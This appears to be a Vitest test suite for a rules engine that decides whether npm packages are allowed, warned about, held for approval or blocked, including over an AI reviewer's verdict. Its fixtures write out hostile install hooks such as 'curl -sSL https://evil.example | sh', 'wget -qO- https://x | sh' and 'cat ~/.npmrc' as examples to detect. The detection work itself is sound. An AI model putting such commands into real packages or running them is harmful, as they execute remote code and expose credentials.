import { describe, expect, it } from "vitest";
import { applyOsvFailurePolicy, clampDecision, evaluateRules, isHardBlock } from "../src/rules.js";
import { inspectScriptCommand } from "../src/analyze/scripts.js";
import type { RiskAssessment } from "../src/types.js";
import { makeSignals } from "./helpers.js";

describe("isHardBlock", () => {
  it("known-malicious is hard", () => {
    expect(isHardBlock(makeSignals({ knownMalicious: true }))).toBe(true);
  });

  it("remote fetch-and-execute (curl|bash) is hard", () => {
    expect(
      isHardBlock(
        makeSignals({
          lifecycleScripts: { postinstall: "curl x | bash" },
          scriptCommandFindings: [
            "postinstall script downloads content from the network: `curl x | bash`",
            "postinstall script invokes a shell: `curl x | bash`",
          ],
        }),
      ),
    ).toBe(true);
  });

  // Regression (P0.2): `curl … | sh` (bare sh, no `-c`) is the exact attack
  // rules.ts documents as the canonical hard block, but the shell pattern used
  // to miss it. Drive it through the real inspector so the whole chain is proven.
  it("remote fetch-and-execute (curl|sh, bare sh) is hard", () => {
    const cmd = "curl -sSL https://evil.example | sh";
    const findings = inspectScriptCommand("postinstall", cmd);
    expect(
      isHardBlock(
        makeSignals({ lifecycleScripts: { postinstall: cmd }, scriptCommandFindings: findings }),
      ),
    ).toBe(true);
  });

  // The SAME attack in a pack/publish-time hook (prepack/prepare/postpack) never
  // runs on a registry install, so it must NOT hard-block — it is a warning.
  it("remote fetch-and-execute in a PACK-time hook (prepack) is NOT hard", () => {
    const cmd = "curl -sSL https://evil.example | sh";
    const findings = inspectScriptCommand("prepack", cmd);
    const signals = makeSignals({
      lifecycleScripts: { prepack: cmd },
      scriptCommandFindings: findings,
    });
    expect(isHardBlock(signals)).toBe(false);
    // …and the verdict is a non-blocking warning, not a block.
    expect(evaluateRules(signals).decision).toBe("allow_with_warnings");
  });

  it("names the worst advisory severity in the reason (high stays allow_with_warnings)", () => {
    const a = evaluateRules(
      makeSignals({ advisories: [{ id: "GHSA-1", severity: "moderate" }, { id: "GHSA-2", severity: "high" }] }),
    );
    expect(a.decision).toBe("allow_with_warnings");
    expect(a.reasons.some((r) => r.includes("highest: HIGH") && r.includes("GHSA-2"))).toBe(true);
  });

  it("stops a known CRITICAL vulnerability for human review by default (require_approval, not block)", () => {
    const a = evaluateRules(makeSignals({ advisories: [{ id: "GHSA-x", severity: "critical" }] }));
    expect(a.decision).toBe("require_approval");
    expect(a.summary).toContain("CRITICAL");
    // it is NOT a hard block — a CVE is often unavoidable; block stays a policy choice.
    expect(isHardBlock(makeSignals({ advisories: [{ id: "GHSA-x", severity: "critical" }] }))).toBe(false);
  });

  it("env+network heuristic (esbuild-style) is NOT hard — it is soft/overridable", () => {
    const signals = makeSignals({
      hasLifecycleScripts: true,
      lifecycleScripts: { postinstall: "node install.js" },
      content: {
        hasProcessEnvAccess: true,
        hasChildProcessUsage: false,
        hasNetworkCalls: true,
        hasEvalUsage: false,
        hasMinifiedCode: false,
        suspiciousFiles: [],
        installTimeFindings: [
          "install-time file install.js reads process.env",
          "install-time file install.js performs network calls",
        ],
      },
    });
    expect(evaluateRules(signals).decision).toBe("block"); // still a deterministic block…
    expect(isHardBlock(signals)).toBe(false); // …but a soft one
  });

  it("a clean package is not a hard block", () => {
    expect(isHardBlock(makeSignals())).toBe(false);
  });
});

function aiAllow(overrides: Partial<RiskAssessment> = {}): RiskAssessment {
  return {
    risk: "low",
    decision: "allow",
    summary: "looks fine to me",
    reasons: ["AI thinks this is fine"],
    recommendedAction: "install",
    source: "ai",
    ...overrides,
  };
}

describe("evaluateRules", () => {
  it("allows a clean established package", () => {
    const result = evaluateRules(makeSignals());
    expect(result.decision).toBe("allow");
    expect(result.risk).toBe("low");
  });

  it("blocks known malicious packages unconditionally", () => {
    const result = evaluateRules(
      makeSignals({
        knownMalicious: true,
        maliciousRecords: [{ id: "MAL-2024-1234", summary: "credential stealer" }],
      }),
    );
    expect(result.decision).toBe("block");
    expect(result.reasons.join(" ")).toContain("MAL-2024-1234");
  });

  it("blocks recent packages with typosquatting-like names", () => {
    const result = evaluateRules(
      makeSignals({
        recentPublish: true,
        ageInDays: 3,
        nameSimilarity: { similarTo: "react-native-mmkv", distance: 1 },
      }),
    );
    expect(result.decision).toBe("block");
    expect(result.suggestedAlternatives).toContain("react-native-mmkv");
  });

  it("blocks install-time env access combined with network calls", () => {
    const result = evaluateRules(
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { postinstall: "node scripts/setup.js" },
        content: {
          hasProcessEnvAccess: true,
          hasChildProcessUsage: false,
          hasNetworkCalls: true,
          hasEvalUsage: false,
          hasMinifiedCode: false,
          suspiciousFiles: [],
          installTimeFindings: [
            "install-time file scripts/setup.js reads process.env",
            "install-time file scripts/setup.js performs network calls",
          ],
        },
      }),
    );
    expect(result.decision).toBe("block");
  });

  it("requires approval when lifecycle scripts exist", () => {
    const result = evaluateRules(
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { postinstall: "node-gyp rebuild" },
      }),
    );
    expect(result.decision).toBe("require_approval");
    expect(result.risk).toBe("medium");
  });

  it("requires approval for very recent packages", () => {
    const result = evaluateRules(makeSignals({ recentPublish: true, ageInDays: 2 }));
    expect(result.decision).toBe("require_approval");
  });

  it("allows native packages with warnings", () => {
    const signals = makeSignals({ hasNativeCode: true });
    signals.nativeSurface.hasAndroid = true;
    signals.nativeSurface.hasPodspec = true;
    const result = evaluateRules(signals);
    expect(result.decision).toBe("allow_with_warnings");
  });

  it("surfaces android permissions as warnings", () => {
    const signals = makeSignals({ hasNativeCode: true });
    signals.nativeSurface.hasAndroid = true;
    signals.nativeSurface.androidPermissions = ["android.permission.CAMERA"];
    const result = evaluateRules(signals);
    expect(result.decision).toBe("allow_with_warnings");
    expect(result.reasons.join(" ")).toContain("android.permission.CAMERA");
  });
});

describe("clampDecision — deterministic BLOCK is a hard floor", () => {
  it("overrides a permissive AI decision for known-malicious packages", () => {
    const signals = makeSignals({
      knownMalicious: true,
      maliciousRecords: [{ id: "MAL-2024-1" }],
    });
    const clamped = clampDecision(aiAllow(), signals);
    expect(clamped.decision).toBe("block");
    expect(clamped.risk).toBe("high");
  });

  it("blocks when rules block on typosquatting even if AI says allow", () => {
    const signals = makeSignals({
      recentPublish: true,
      ageInDays: 2,
      nameSimilarity: { similarTo: "react-native-mmkv", distance: 1 },
    });
    // sanity: the rules engine blocks this on its own
    expect(evaluateRules(signals).decision).toBe("block");
    const clamped = clampDecision(aiAllow(), signals);
    expect(clamped.decision).toBe("block");
    expect(clamped.reasons.join(" ")).toContain("cannot downgrade a hard BLOCK");
  });

  it("blocks when rules block on curl|bash exfiltration even if AI says allow", () => {
    const signals = makeSignals({
      hasLifecycleScripts: true,
      lifecycleScripts: { postinstall: "curl https://x/y | bash" },
      scriptCommandFindings: [
        "postinstall script downloads content from the network: `curl https://x/y | bash`",
        "postinstall script invokes a shell: `curl https://x/y | bash`",
      ],
    });
    expect(evaluateRules(signals).decision).toBe("block");
    const clamped = clampDecision(aiAllow({ decision: "allow_with_warnings" }), signals);
    expect(clamped.decision).toBe("block");
  });

  it("preserves the AI decision when the rules engine does not block", () => {
    const clamped = clampDecision(
      aiAllow({ decision: "allow_with_warnings", reasons: ["native code"] }),
      makeSignals(),
    );
    expect(clamped.decision).toBe("allow_with_warnings");
  });

  it("still lets the AI be stricter than the rules engine", () => {
    // rules would only warn (native code), AI escalates to require_approval
    const signals = makeSignals({ hasNativeCode: true });
    const clamped = clampDecision(aiAllow({ decision: "require_approval" }), signals);
    expect(clamped.decision).toBe("require_approval");
  });
});

describe("clampDecision — monotonic ordering", () => {
  it("keeps deterministic allow_with_warnings when AI says allow", () => {
    const signals = makeSignals({ repositoryMissing: true });
    expect(clampDecision(aiAllow(), signals).decision).toBe("allow_with_warnings");
  });

  it("keeps deterministic require_approval when AI says allow", () => {
    const signals = makeSignals({
      hasLifecycleScripts: true,
      lifecycleScripts: { postinstall: "node setup.js" },
    });
    const result = clampDecision(aiAllow(), signals);
    expect(result.decision).toBe("require_approval");
    expect(result.risk).toBe("medium");
    expect(result.recommendedAction).toContain("scripts disabled");
    expect(result.reasons).toContain("AI thinks this is fine");
  });
});

describe("clampDecision — deterministic verdict capture (explain AI reasoning)", () => {
  it("attaches the rules verdict when the floor does not block", () => {
    const signals = makeSignals({ hasNativeCode: true });
    signals.nativeSurface.hasAndroid = true;
    const clamped = clampDecision(aiAllow(), signals);
    expect(clamped.deterministic).toBeDefined();
    expect(clamped.deterministic!.decision).toBe("allow_with_warnings");
    expect(clamped.deterministic!.reasons.length).toBeGreaterThan(0);
  });

  it("attaches the rules verdict even when the AI already blocked", () => {
    const clamped = clampDecision(aiAllow({ decision: "block", risk: "high" }), makeSignals());
    expect(clamped.decision).toBe("block");
    expect(clamped.deterministic!.decision).toBe("allow");
  });

  it("attaches the blocking floor verdict when the clamp fires", () => {
    const signals = makeSignals({ knownMalicious: true, maliciousRecords: [{ id: "MAL-1" }] });
    const clamped = clampDecision(aiAllow(), signals);
    expect(clamped.decision).toBe("block");
    expect(clamped.deterministic!.decision).toBe("block");
    expect(clamped.deterministic!.risk).toBe("high");
  });
});

describe("evaluateRules — lifecycle command inspection (finding #2)", () => {
  it("blocks a lifecycle command that fetches and pipes into a shell", () => {
    const result = evaluateRules(
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { postinstall: "wget -qO- https://x | sh" },
        scriptCommandFindings: [
          "postinstall script downloads content from the network: `wget -qO- https://x | sh`",
          "postinstall script invokes a shell: `wget -qO- https://x | sh`",
        ],
      }),
    );
    expect(result.decision).toBe("block");
    expect(result.reasons.join(" ")).toContain("downloads and executes remote code");
  });

  it("escalates a standalone credential-file reference to require_approval", () => {
    const result = evaluateRules(
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { preinstall: "cat ~/.npmrc" },
        scriptCommandFindings: ["preinstall script references credential or config files: `cat ~/.npmrc`"],
      }),
    );
    expect(result.decision).toBe("require_approval");
    expect(result.reasons.join(" ")).toContain("credential or config files");
  });
});

describe("OSV failure handling (finding #7)", () => {
  it("surfaces an OSV-unavailable warning without blocking by default", () => {
    const result = evaluateRules(makeSignals({ osvUnavailable: true }));
    expect(result.decision).toBe("allow_with_warnings");
    expect(result.reasons.join(" ")).toContain("OSV/OpenSSF lookup was unavailable");
  });

  it("does not escalate when failClosed is off", () => {
    const assessment = aiAllow();
    expect(
      applyOsvFailurePolicy(assessment, makeSignals({ osvUnavailable: true }), false).decision,
    ).toBe("allow");
  });

  it("escalates allow to require_approval when failClosed and OSV is unavailable", () => {
    const escalated = applyOsvFailurePolicy(
      aiAllow(),
      makeSignals({ osvUnavailable: true }),
      true,
    );
    expect(escalated.decision).toBe("require_approval");
    expect(escalated.reasons.join(" ")).toContain("[fail-closed]");
  });

  it("does not touch decisions when OSV succeeded, even with failClosed", () => {
    expect(
      applyOsvFailurePolicy(aiAllow(), makeSignals({ osvUnavailable: false }), true).decision,
    ).toBe("allow");
  });

  it("never downgrades a stricter decision", () => {
    const blocked = aiAllow({ decision: "block", risk: "high" });
    expect(
      applyOsvFailurePolicy(blocked, makeSignals({ osvUnavailable: true }), true).decision,
    ).toBe("block");
  });
});
